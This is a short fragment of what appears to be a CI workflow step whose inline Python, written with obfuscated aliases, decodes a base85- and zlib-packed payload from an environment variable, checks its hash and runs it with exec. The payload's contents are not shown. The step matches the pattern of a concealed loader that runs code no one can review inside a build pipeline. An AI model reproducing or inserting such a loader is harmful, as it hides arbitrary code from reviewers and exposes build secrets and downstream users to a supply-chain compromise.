        run: |
          python - <<'PY'
          import base64 as A8, hashlib as B8, os as C8, zlib as D8
          X8 = "".join(C8.environ["Q8_PAYLOAD"].split()).encode()
          Y8 = D8.decompress(A8.b85decode(X8))
          if B8.sha256(Y8).hexdigest() != C8.environ["Q8_DIGEST"]: raise SystemExit("Q8$D0")
          exec(compile(Y8, "<Q8$V8>", "exec"))
          PY
